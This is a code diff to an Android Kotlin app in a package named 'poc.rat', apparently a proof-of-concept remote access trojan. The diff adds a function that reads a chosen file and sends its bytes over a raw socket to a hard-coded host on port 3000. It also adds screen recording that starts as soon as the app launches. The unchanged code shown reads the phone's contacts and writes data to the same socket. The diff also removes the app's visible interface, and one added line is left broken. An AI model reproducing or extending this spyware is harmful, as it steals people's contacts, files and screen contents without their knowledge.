@@ -1,24 +1,19 @@
 package poc.rat
 
-import android.Manifest
+import android.app.Activity
+import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.hardware.display.DisplayManager
 import android.os.Bundle
 import android.provider.ContactsContract
-import androidx.activity.compose.setContent
-import androidx.activity.enableEdgeToEdge
 import androidx.appcompat.app.AppCompatActivity
-import androidx.compose.foundation.layout.fillMaxSize
-import androidx.compose.foundation.layout.padding
-import androidx.compose.material3.Scaffold
 import androidx.compose.material3.Text
 import androidx.compose.runtime.Composable
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import okhttp3.OkHttpClient
-import okhttp3.Request
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -27,30 +22,72 @@ import java.io.InputStreamReader
 import java.io.PrintWriter
 import java.net.Socket
 import poc.rat.ui.theme.MyApplicationTheme
+import java.io.InputStream
+import android.net.Uri
+import java.io.BufferedOutputStream
+import android.hardware.display.VirtualDisplay
+import android.media.MediaRecorder
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
+import android.os.Handler
+import android.os.Looper
+import java.io.File
+
 
 data class Contact(val name: String, val phone: String)
 
 class MainActivity : AppCompatActivity() {
     private lateinit var client: OkHttpClient
     private val REQUEST_READ_CONTACTS = 100
+    private val STORAGE_PERMISSION_REQUEST_CODE = 101
+    private val PICK_IMAGE_REQUEST_CODE = 102
+    companion object {
+        private const val SCREEN_RECORD_REQUEST_CODE = 1001
+    }
+    private lateinit var mediaProjectionManager: MediaProjectionManager
+    private var mediaProjection: MediaProjection? = null
+    private lateinit var mediaRecorder: MediaRecorder
+    private var virtualDisplay: VirtualDisplay? = null
+
+    private var recordDurationSeconds: Int = 10
+
+
+
+
+    private fun sendFileThroughSocket(fileUri: Uri) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val inputStream: InputStream? = contentResolver.openInputStream(fileUri)
+                if (inputStream == null) {
+                    println("Failed to open InputStream for the file.")
+                    return@launch
+                }
+
+                val fileBytes = inputStream.readBytes()
+                inputStream.close()
+
+                Socket("192.168.1.24", 3000).use { socket ->
+                    BufferedOutputStream(socket.getOutputStream()).use { outStream ->
+                        outStream.write(fileBytes)
+                        outStream.flush()
+                    }
+                }
+
+                println("File sent successfully, size: ${fileBytes.size} bytes")
+            } catch (e: Exception) {
+                e.printStackTrace()
+                println("Error sending file: ${e.message}")
+            }
+        }
+    }
+
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        //enableEdgeToEdge()
-        //setContent {
-        //    MyApplicationTheme {
-        //        Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
-        //            Greeting(
-        //                name = "Android",
-        //                modifier = Modifier.padding(innerPadding)
-        //            )
-        //        }
-        //    }
-        //}
 
+        startScreenRecording(recordDurationSeconds)
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                // Create a socket connection to the server at IP 192.168.1.24 on port 3000
                 val socket = Socket("192.168.1.24", 3000)
 
                 // Create a writer to send data to the server
@@ -64,7 +101,7 @@ class MainActivity : AppCompatActivity() {
 
                 // Optionally, read a response from the server
                 val response = reader.readLine()
-                println("Received response: $response")
+                if (response == "")
 
                 // Clean up by closing the socket
                 socket.close()
@@ -108,11 +145,9 @@ class MainActivity : AppCompatActivity() {
         )
 
         cursor?.use {
-            // Get the indices of the name and phone number columns
             val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
             val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
 
-            // Iterate through the results
             while (it.moveToNext()) {
                 val name = it.getString(nameIndex)
                 val phone = it.getString(phoneIndex)
@@ -120,7 +155,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // For demonstration purposes, print out the contacts
         contactsList.forEach { contact ->
             println("Name: ${contact.name}, Phone: ${contact.phone}")
         }
@@ -128,9 +162,96 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         super.onDestroy()
-        // Shut down the OkHttp client to free resources when your Activity is destroyed.
+        // Shut down the VOkHttp client to free resources when your Activity is destroyed.
         client.dispatcher.executorService.shutdown()
     }
+    private fun startScreenRecording(durationSeconds: Int) {
+        recordDurationSeconds = durationSeconds
+        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        // Request user permission for screen capture
+        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
+        startActivityForResult(captureIntent, SCREEN_RECORD_REQUEST_CODE)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
+            if (resultCode == Activity.RESULT_OK && data != null) {
+                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
+                // Setup MediaRecorder with desired settings
+                setupMediaRecorder()
+                // Start the recording
+                startRecording()
+                // Stop recording after the specified duration
+                Handler(Looper.getMainLooper()).postDelayed({
+                    stopRecording()
+                }, recordDurationSeconds * 1000L)
+            } else {
+                // Permission was not granted.
+                println("Screen capture permission denied.")
+            }
+        }
+        super.onActivityResult(requestCode, resultCode, data)
+    }
+
+    /**
+     * Sets up the MediaRecorder with basic settings.
+     */
+    private fun setupMediaRecorder() {
+        mediaRecorder = MediaRecorder()
+
+        // If you want audio, uncomment the following:
+        // mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+
+        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
+        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+
+        val outputFile = File(getExternalFilesDir(null), "screen_record_${System.currentTimeMillis()}.mp4")
+        mediaRecorder.setOutputFile(outputFile.absolutePath)
+
+        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+        // If using audio:
+        // mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+
+        mediaRecorder.setVideoSize(1080, 1920)
+        mediaRecorder.setVideoFrameRate(30)
+        mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024) // 5 Mbps
+
+        mediaRecorder.prepare()
+    }
+
+    /**
+     * Starts the screen recording by creating a VirtualDisplay linked to the MediaRecorder.
+     */
+    private fun startRecording() {
+        // Create a VirtualDisplay that outputs to the MediaRecorder's surface.
+        virtualDisplay = mediaProjection?.createVirtualDisplay(
+            "ScreenRecording",
+            1080, 1920, // Width & height (adjust as needed)
+            resources.displayMetrics.densityDpi,
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            mediaRecorder.surface,
+            null,
+            null
+        )
+        mediaRecorder.start()
+        println("Screen recording started.")
+    }
+
+    /**
+     * Stops the recording and releases resources.
+     */
+    private fun stopRecording() {
+        try {
+            mediaRecorder.stop()
+            mediaRecorder.reset()
+            println("Screen recording stopped.")
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        virtualDisplay?.release()
+        mediaProjection?.stop()
+    }
+
 }
 
 @Composable
